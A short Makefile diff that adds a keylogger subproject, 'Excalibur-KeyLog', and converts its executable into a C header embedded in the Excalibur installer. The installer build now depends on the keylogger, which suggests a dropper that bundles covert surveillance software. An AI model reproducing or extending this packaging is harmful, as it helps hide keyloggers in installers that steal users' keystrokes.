@@ -2,10 +2,11 @@ BIN_DIR = bin
 OBJ_DIR = bin-int
 
 APP_DIR = Excalibur
+LOG_DIR = Excalibur-KeyLog
 INS_DIR = Excalibur-Installer
 ENC_DIR = $(INS_DIR)/src/Binaries
 
-all: excaliburInstaller
+all: installer
 .PHONY: boot
 
 boot:
@@ -18,7 +19,11 @@ excalibur:
 	cd $(APP_DIR) && $(MAKE)
 	xxd -i $(BIN_DIR)/Excalibur.exe > $(ENC_DIR)/ExcaliburBinary.h
 
-excaliburInstaller: boot excalibur
+keylogger:
+	cd $(LOG_DIR) && $(MAKE)
+	xxd -i $(BIN_DIR)/Excalibur-KeyLog.exe > $(ENC_DIR)/KeyLogBinary.h
+
+installer: boot keylogger excalibur
 	cd $(INS_DIR) && $(MAKE)
 
 clean:
